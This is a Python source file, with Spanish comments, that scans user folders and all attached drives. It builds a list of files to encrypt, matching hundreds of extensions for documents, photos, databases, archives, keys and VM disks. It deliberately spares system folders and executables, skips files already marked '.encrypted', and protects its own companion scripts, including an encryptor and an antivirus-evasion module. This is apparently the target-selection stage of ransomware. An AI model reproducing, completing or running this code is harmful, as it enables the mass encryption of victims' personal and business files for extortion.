import os
import platform
import ctypes
from collections import defaultdict


def es_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def escanear_sistema():
    sistema = platform.system()
    admin = es_admin()
    
    # PROTECCIÓN CRÍTICA: Carpetas del sistema que NUNCA se deben tocar
    carpetas_sistema_criticas = {
        'Windows', 'WINDOWS', 'windows',
        'Windows\\System32', 'Windows\\SysWOW64', 'Windows\\WinSxS',
        'Windows\\Boot', 'Windows\\Fonts', 'Windows\\Cursors',
        'Windows\\PolicyDefinitions', 'Windows\\schemas',
        'Windows\\security', 'Windows\\ServerSetup',
        'Windows\\servicing', 'Windows\\Setup', 'Windows\\ShellNew',
        'Windows\\Speech', 'Windows\\System', 'Windows\\Tasks',
        'Windows\\TAPI', 'Windows\\tracing', 'Windows\\twain_32',
        'Windows\\Web', 'Windows\\WindowsUpdate', 'Windows\\WaaS',
        'Program Files', 'Program Files (x86)',
        'Program Files\\Windows', 'Program Files (x86)\\Windows',
        'ProgramData', 'ProgramData\\Microsoft',
        'ProgramData\\Microsoft\\Windows',
        '$Recycle.Bin', 'python_portable', 
        'AppData\\Local\\Temp', 'AppData\\Local\\Microsoft',
        'AppData\\Roaming\\Microsoft\\Windows',
        'AppData\\LocalLow\\Microsoft',
        'PerfLogs', 'Windows.old', 'Recovery',
        'System Volume Information', '$WINDOWS.~BT',
        'Windows\\Installer', 'Windows\\assembly',
        'Windows\\Microsoft.NET', 'Windows\\Panther',
        'Windows\\ServiceProfiles', 'Windows\\SoftwareDistribution',
        'Windows\\SystemResources', 'Windows\\Vss',
        'Windows\\CSC', 'Windows\\CbsTemp',
        'Windows\\Containers', 'Windows\\Downloaded Program Files',
        'Windows\\ehome', 'Windows\\Help', 'Windows\\IME',
        'Windows\\inf', 'Windows\\LiveKernelReports',
        'Windows\\Logs', 'Windows\\Migration',
        'Windows\\ModemLogs', 'Windows\\Offline Web Pages',
        'ProgramData\\Microsoft\\Diagnosis',
        'ProgramData\\Microsoft\\Network',
        'ProgramData\\Microsoft\\Search',
        'ProgramData\\Package Cache',
        'AppData\\Local\\Microsoft\\Windows\\Explorer',
        'AppData\\Local\\Microsoft\\Windows\\Shell',
        'AppData\\Local\\Microsoft\\Windows\\INetCache',
        'AppData\\Local\\Microsoft\\Windows\\WebCache',
        'AppData\\Local\\Microsoft\\Windows\\History',
        'AppData\\Local\\Packages',
        'Intel', 'AMD', 'NVIDIA', 'Drivers'
    }
    
    # EXTENSIONES QUE SÍ SE ENCRIPTAN (lista ampliada)

    extensiones = {
    '.txt', '.doc', '.docx', '.docm', '.dot', '.dotx', '.dotm', '.pdf', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlt', '.xltx', '.xltm', '.xlam', '.ppt', '.pptx', '.pptm', '.pot', '.potx', '.potm', '.pps', '.ppsx', '.ppsm', '.ppa', '.ppam',
    '.odt', '.ods', '.odp', '.odg', '.odf', '.odb', '.odc', '.odm', '.ott', '.ots', '.otp', '.otg', '.otf', '.oth', '.rtf', '.tex', '.wpd', '.wps', '.pages', '.numbers', '.key',
    '.sxw', '.stw', '.sxc', '.stc', '.sxi', '.sti', '.sxd', '.std', '.sxg',
    '.csv', '.tsv', '.tab', '.dat', '.data', '.dsv',
    '.htm', '.html', '.xhtml', '.mhtml', '.mht', '.xht', '.hta', '.htc', '.htmls',
    '.css', '.scss', '.sass', '.less', '.styl', '.stylus',
    '.js', '.jsx', '.mjs', '.cjs', '.json', '.json5', '.jsonc', '.jsonl', '.ndjson',
    '.ts', '.tsx', '.d.ts',
    '.vue', '.svelte', '.angular', '.ng',
    '.xml', '.xsl', '.xslt', '.xsd', '.dtd', '.rss', '.atom', '.opml', '.plist', '.xul', '.xaml', '.svg', '.svgz',
    '.php', '.php3', '.php4', '.php5', '.php7', '.phps', '.phtml', '.phar',
    '.asp', '.aspx', '.asax', '.ascx', '.ashx', '.asmx', '.axd',
    '.jsp', '.jspx', '.jspf',
    '.py', '.pyc', '.pyo', '.pyd', '.pyw', '.pyx', '.pyz', '.pyi',
    '.rb', '.rbw', '.rake', '.gemspec',
    '.java', '.class', '.jar', '.war', '.ear', '.jad', '.jsp',
    '.c', '.h', '.cpp', '.cc', '.cxx', '.hpp', '.hxx', '.hh', '.c++', '.h++',
    '.cs', '.csx', '.vb', '.vbs', '.vba', '.vbscript',
    '.go', '.mod', '.sum',
    '.rs', '.rlib',
    '.swift', '.swiftmodule', '.swiftdoc',
    '.kt', '.kts', '.ktm',
    '.scala', '.sc',
    '.groovy', '.gvy', '.gy', '.gsh',
    '.pl', '.pm', '.t', '.pod',
    '.lua', '.luac',
    '.r', '.rdata', '.rds', '.rda',
    '.m', '.mat', '.fig', '.slx', '.mdl',
    '.f', '.for', '.f90', '.f95', '.f03',
    '.pas', '.pp', '.inc', '.dpr', '.dpk',
    '.asm', '.s', '.a51',
    '.sh', '.bash', '.zsh', '.fish', '.ksh', '.csh', '.tcsh',
    '.bat', '.cmd', '.btm',
    '.ps1', '.psm1', '.psd1', '.ps1xml', '.pssc', '.psrc', '.cdxml',
    '.ahk', '.ahkl',
    '.au3',
    '.sql', '.mysql', '.pgsql', '.sqlite', '.db', '.db3', '.sqlite3', '.mdb', '.accdb', '.accde', '.accdr', '.accdt', '.mde', '.mdf', '.ldf', '.dbf', '.dbc', '.frm', '.myd', '.myi', '.ibd', '.ibdata', '.ib_logfile', '.sqlitedb', '.fdb', '.gdb', '.ib', '.nsf', '.wdb', '.fp7', '.fmp12', '.fmpsl', '.usr',
    '.ora', '.dbx', '.trc', '.log',
    '.jpg', '.jpeg', '.jpe', '.jfif', '.jif', '.jfi',
    '.png', '.apng',
    '.gif', '.gifv',
    '.bmp', '.dib',
    '.tif', '.tiff',
    '.webp',
    '.svg', '.svgz',
    '.ico', '.cur',
    '.psd', '.psb', '.pdd',
    '.ai', '.ait', '.art',
    '.eps', '.epsf', '.epsi',
    '.indd', '.indt', '.indl', '.indb', '.inx', '.idml',
    '.pdf', '.pdfa', '.fdf', '.xfdf',
    '.cdr', '.cdt', '.ccx', '.cmx',
    '.sketch',
    '.fig',
    '.xd',
    '.xcf', '.xjt',
    '.kra', '.krz',
    '.ora',
    '.pdn',
    '.clip',
    '.sai', '.sai2',
    '.mdp',
    '.psp', '.pspimage',
    '.xcf',
    '.raw', '.cr2', '.cr3', '.crw', '.nef', '.nrw', '.arw', '.srf', '.sr2', '.dng', '.orf', '.raf', '.rw2', '.pef', '.srw', '.x3f', '.erf', '.mef', '.mrw', '.nksc', '.3fr', '.ari', '.bay', '.cap', '.iiq', '.eip', '.fff',
    '.exr', '.hdr', '.pic', '.pict', '.pct',
    '.dds', '.tga', '.icb', '.vda', '.vst',
    '.pcx', '.dcx',
    '.sgi', '.rgb', '.rgba', '.bw', '.int', '.inta',
    '.jp2', '.j2k', '.jpf', '.jpx', '.jpm', '.mj2',
    '.jxr', '.hdp', '.wdp',
    '.heic', '.heif', '.heics', '.heifs', '.avci', '.avcs', '.avif', '.avifs',
    '.mp4', '.m4v', '.m4p', '.m4b', '.m4r', '.m4a',
    '.mov', '.qt',
    '.avi', '.divx',
    '.mkv', '.mk3d', '.mka', '.mks',
    '.wmv', '.wm', '.asf',
    '.flv', '.f4v', '.f4p', '.f4a', '.f4b',
    '.webm',
    '.mpg', '.mpeg', '.mpe', '.m1v', '.m2v', '.mpv', '.mp2', '.mpa',
    '.vob', '.ifo', '.bup',
    '.3gp', '.3g2', '.3gpp', '.3gpp2',
    '.ogv', '.ogm', '.ogg', '.ogx',
    '.rm', '.rmvb', '.rv', '.rmj', '.rms', '.rmx', '.rmm',
    '.ts', '.mts', '.m2ts', '.m2t',
    '.xvid',
    '.dv', '.dvr-ms',
    '.swf', '.flv',
    '.wtv',
    '.yuv', '.y4m',
    '.mxf',
    '.roq',
    '.nsv', '.nsa',
    '.svi',
    '.amv',
    '.mp3', '.mp2', '.mp1',
    '.m4a', '.m4b', '.m4p', '.m4r',
    '.aac', '.aacp',
    '.flac', '.fla',
    '.wav', '.wave',
    '.wma', '.wmv',
    '.ogg', '.oga', '.ogx', '.opus', '.spx',
    '.aiff', '.aif', '.aifc',
    '.au', '.snd',
    '.mid', '.midi', '.kar', '.rmi',
    '.ape', '.apl',
    '.alac', '.m4a',
    '.ac3',
    '.dts', '.dtshd',
    '.tta',
    '.wv', '.wvc',
    '.mka',
    '.mpa',
    '.ra', '.ram', '.rm',
    '.voc',
    '.vox',
    '.amr', '.awb',
    '.gsm',
    '.dss', '.ds2',
    '.msv', '.dvf',
    '.m4p',
    '.aa', '.aax', '.aaxc',
    '.webm', '.weba',
    '.opus',
    '.tak',
    '.ofr', '.ofs',
    '.spx',
    '.caf',
    '.zip', '.zipx', '.z',
    '.rar', '.rev', '.r00', '.r01',
    '.7z', '.7zip',
    '.tar', '.taz', '.tz', '.tar.gz', '.tgz', '.tar.bz2', '.tbz', '.tbz2', '.tar.xz', '.txz', '.tar.lz', '.tar.lzma', '.tlz',
    '.gz', '.gzip',
    '.bz', '.bz2', '.bzip2',
    '.xz', '.lzma',
    '.lz', '.lz4', '.lzo',
    '.zst', '.zstd',
    '.cab', '.msu',
    '.iso', '.img', '.bin', '.cue', '.nrg', '.mdf', '.mds', '.ccd', '.sub', '.cdi', '.b5t', '.b6t', '.bwt', '.cif', '.dmg', '.toast', '.vcd',
    '.arc', '.arj', '.ark',
    '.ace',
    '.lha', '.lzh',
    '.sit', '.sitx',
    '.sea',
    '.zoo',
    '.pak', '.pk3', '.pk4',
    '.wim', '.swm', '.esd',
    '.rpm', '.deb', '.pkg', '.apk', '.ipa', '.appx', '.msix', '.xap',
    '.shar',
    '.uue', '.uu', '.xxe',
    '.alz',
    '.egg',
    '.partimg',
    '.sqx', '.sqfs',
    '.vhd', '.vhdx', '.vdi', '.vmdk', '.qcow', '.qcow2', '.hdd', '.hds', '.avhd', '.avhdx', '.vfd',
    '.ova', '.ovf',
    '.vmx', '.vmsd', '.vmsn', '.vmem', '.nvram', '.vmxf', '.vmdk', '.vmss',
    '.vbox', '.vbox-prev',
    '.hdd',
    '.parallels', '.pvm', '.pvs',
    '.qcow', '.qcow2', '.qed',
    '.cer', '.crt', '.der', '.pem', '.p7b', '.p7c', '.p7s', '.p7r', '.spc', '.pfx', '.p12', '.csr', '.key', '.pub', '.pgp', '.gpg', '.asc', '.sig', '.jks', '.keystore', '.truststore', '.pem', '.ppk', '.kdb', '.kdbx',
    '.eml', '.emlx', '.msg', '.oft', '.ost', '.pst', '.mbox', '.mbx', '.dbx', '.wab', '.pab', '.mmf', '.vcf', '.vcard', '.contact', '.ics', '.ical', '.ifb', '.vcs',
    '.epub', '.mobi', '.azw', '.azw3', '.azw4', '.azw1', '.kfx', '.kf8', '.prc', '.tpz', '.azw6', '.pobi', '.acsm', '.fb2', '.fbz', '.fb2.zip', '.djvu', '.djv', '.lit', '.lrf', '.lrx', '.cbr', '.cbz', '.cb7', '.cbt', '.cba', '.ibook', '.ibooks', '.pdb', '.opf', '.ncx', '.tr2', '.tr3', '.htmlz', '.ebook',
    '.dwg', '.dxf', '.dwf', '.dgn', '.rvt', '.rfa', '.rte', '.rft', '.skp', '.3dm', '.blend', '.blend1', '.max', '.3ds', '.obj', '.fbx', '.dae', '.stl', '.ply', '.wrl', '.x3d', '.step', '.stp', '.iges', '.igs', '.sat', '.sldprt', '.sldasm', '.slddrw', '.prt', '.asm', '.drw', '.ipt', '.iam', '.idw', '.ipn', '.catpart', '.catproduct', '.catshape', '.model', '.session', '.exp', '.dlv', '.pvz', '.psmodel',
    '.lnk', '.url', '.webloc', '.website', '.desktop', '.directory', '.ink', '.scf',
    '.ini', '.inf', '.cfg', '.conf', '.config', '.properties', '.prop', '.toml', '.yaml', '.yml', '.json', '.xml', '.plist', '.reg', '.manifest', '.settings', '.prefs',
    '.env', '.env.local', '.env.development', '.env.production', '.env.test',
    '.editorconfig', '.prettierrc', '.eslintrc', '.babelrc', '.npmrc', '.yarnrc', '.gitignore', '.gitattributes', '.dockerignore', '.htaccess', '.htpasswd',
    '.log', '.logs', '.slog', '.elog', '.out', '.trace',
    '.bak', '.backup', '.old', '.orig', '.sav', '.save', '.tmp', '.temp', '.cache', '.~', '.swp', '.swo', '.swn', '.bkp', '.bk', '.gho', '.v2i', '.mrimg', '.bak~', '.$$$',
    '.part', '.crdownload', '.download', '.partial', '.opdownload', '.dap', '.dlm', '.egt', '.!ut', '.bc!',
    '.torrent', '.magnet',
    '.nfo', '.diz', '.me', '.1st', '.readme', '.now',
    '.chm', '.hlp', '.col',
    '.wri', '.ans',
    '.dmp', '.dump', '.memory.dmp', '.mdmp', '.hdmp',
    '.etl', '.evtx', '.evt',
    '.cap', '.pcap', '.pcapng', '.snoop', '.trc',
    '.db-shm', '.db-wal',
    '.idx', '.sub', '.srt', '.ass', '.ssa', '.smi', '.sub', '.txt',
    '.m3u', '.m3u8', '.pls', '.asx', '.wax', '.wvx', '.wmx', '.cue', '.xspf',
    '.theme', '.themepack', '.msstyles', '.style',
    '.scr', '.theme',
    '.fon', '.ttf', '.ttc', '.otf', '.woff', '.woff2', '.eot',
    '.cur', '.ani',
    '.icns', '.iconset',
    '.localized', '.strings', '.lproj',
    '.framework', '.bundle', '.plugin', '.xpc', '.appex',
    '.action', '.workflow', '.caction', '.scpt', '.scptd', '.applescript',
    '.gadget', '.gadgetproj',
    '.thumbs', '.db', '.DS_Store', '.localized', '._*',
    '.laccdb', '.lockfile', '.lock',
    '.prefpane', '.qlgenerator', '.mdimporter', '.kext',
    '.xib', '.nib', '.storyboard', '.storyboardc',
    '.xcodeproj', '.xcworkspace', '.playground',
    '.pro', '.pri', '.qmake', '.ui',
    '.sln', '.suo', '.csproj', '.vbproj', '.fsproj', '.vcxproj', '.props', '.targets',
    '.iml', '.idea',
    '.gradle', '.maven', '.ant',
    '.mk', '.makefile', '.cmake',
    '.bashrc', '.bash_profile', '.profile', '.zshrc', '.vimrc', '.tmux.conf',
    '.service', '.socket', '.timer', '.path', '.mount', '.automount', '.swap', '.target', '.slice',
    '.so', '.dylib', '.o', '.a', '.lib', '.dll', '.ocx', '.drv', '.ax', '.cpl', '.acm', '.tlb', '.olb',
    '.efi', '.elf',
    '.sol', '.abi', '.bin',
    '.coffee', '.litcoffee',
    '.ejs', '.eta', '.pug', '.jade', '.haml', '.slim', '.erb', '.eco', '.jst', '.hbs', '.handlebars', '.mustache', '.twig', '.blade.php', '.volt', '.liquid', '.njk', '.nunjucks',
    '.ino', '.pde', '.fzz', '.fzp', '.fzpz',
    '.fcstd', '.fcstd1', '.fcbak',
    '.gcode', '.nc', '.tap', '.mpf', '.cnc',
    '.stl', '.obj', '.3mf', '.amf', '.ply',
    '.ifc', '.ifczip',
    '.rfa', '.rte', '.rft', '.rvt',
    '.nwd', '.nwc', '.nwf',
    '.ics', '.ifb', '.ical', '.icalendar',
    '.vcf', '.vcard',
    '.mpp', '.mpt',
    '.vsd', '.vsdx', '.vss', '.vst', '.vsw', '.vdx', '.vsx', '.vtx',
    '.pub',
    '.one', '.onepkg', '.onetoc', '.onetoc2',
    '.xps', '.oxps',
    '.thmx',
    '.glb', '.gltf',
    '.usdz', '.usd', '.usda', '.usdc',
    '.abc', '.ma', '.mb',
    '.nxs',
    '.e57', '.pts', '.ptx', '.las', '.laz',
    '.sbsar', '.sbs', '.sbsasm',
    '.material', '.mat', '.shader',
    '.unity', '.prefab', '.asset', '.scene', '.meta',
    '.unitypackage',
    '.pak', '.vpk', '.bsp', '.wad', '.mdl', '.vtf', '.vmt',
    '.forge', '.mcworld', '.mcpack', '.mcaddon', '.mctemplate',
    '.pk3', '.wad', '.iwad', '.pwad',
    '.big', '.pcx',
    '.rez', '.mix', '.grp',
    '.rpf', '.img',
    '.info', '.nfo', '.about',
}
    
    # EXTENSIONES PROHIBIDAS: NUNCA tocar (SOLO archivos críticos del sistema)
    extensiones_prohibidas = {
        '.exe', '.dll', '.sys',
        '.ttf', '.fon', '.otf',  # Fuentes del sistema
        '.theme', '.msstyles',  # Temas del sistema
    }
    
    # SIEMPRE evitar carpetas críticas
    evitar_parcial = carpetas_sistema_criticas
    
    # ARCHIVOS DE LA APLICACIÓN que NO deben encriptarse (SOLO los del directorio actual)
    archivos_app = {
        'launcher.py', 
        'rutas.py', 
        'encriptador_12_capas.py', 
        'evasion_av.py', 
        'launcher.bat', 
        'launcher.sh',
        'gen_imagen.py',
        'comprimir.py',
    }
    
    dir_app = os.path.abspath(os.getcwd())
    archivos_encontrados = []
    contador_ext = defaultdict(int)
    total = 0
    
    if sistema == "Windows":
        # PROTECCIÓN: NO escanear C:\ completo
        rutas_escanear = [
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Desktop'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Documents'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Downloads'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Pictures'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Videos'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Music'),
            'C:\\Users'
        ]
        
        # Agregar otras unidades (D-Z)
        for letra in 'DEFGHIJKLMNOPQRSTUVWXYZ':
            unidad = f'{letra}:\\'
            if os.path.exists(unidad):
                rutas_escanear.append(unidad)
    else:
        rutas_escanear = ['/home', '/']
    
    for ruta_base in rutas_escanear:
        if not os.path.exists(ruta_base):
            continue
        try:
            for root, dirs, files in os.walk(ruta_base):
                # PROTECCIÓN: Excluir carpetas críticas
                debe_excluir = False
                for carpeta_exc in evitar_parcial:
                    if carpeta_exc in root:
                        debe_excluir = True
                        dirs[:] = []
                        break
                
                # PROTECCIÓN ADICIONAL: Detectar Windows directamente
                if root.startswith('C:\\Windows') or '\\Windows\\' in root:
                    dirs[:] = []
                    continue
                
                # PROTECCIÓN: Detectar Program Files
                if 'Program Files' in root or 'ProgramData' in root:
                    dirs[:] = []
                    continue
                    
                if debe_excluir:
                    continue
                
                root_abs = os.path.abspath(root)
                
                # PROTECCIÓN: Saltar SOLO carpeta de la aplicación (donde está el script)
                if root_abs == dir_app:
                    dirs[:] = []
                    continue
                
                for archivo in files:
                    try:
                        total += 1
                        
                        # PROTECCIÓN 1: Archivos de la app EN LA CARPETA DE LA APP
                        ruta_completa = os.path.join(root, archivo)
                        if os.path.dirname(ruta_completa) == dir_app:
                            if archivo.lower() in [x.lower() for x in archivos_app]:
                                continue
                        
                        # PROTECCIÓN 2: Archivos ya encriptados
                        if archivo.endswith('.encrypted'):
                            continue
                        
                        ext = os.path.splitext(archivo)[1].lower()
                        
                        # PROTECCIÓN 3: Extensiones prohibidas (SOLO sistema crítico)
                        if ext in extensiones_prohibidas:
                            continue
                        
                        incluir = False
                        
                        # REGLA: Si está en la lista de extensiones permitidas
                        if ext in extensiones:
                            incluir = True
                        # REGLA: Archivos sin extensión también se encriptan
                        elif ext == '':
                            incluir = True
                            ext = '[sin_ext]'
                        
                        if incluir:
                            archivos_encontrados.append(ruta_completa)
                            contador_ext[ext] += 1
                    except:
                        continue
        except:
            continue
    
    return archivos_encontrados, contador_ext, total
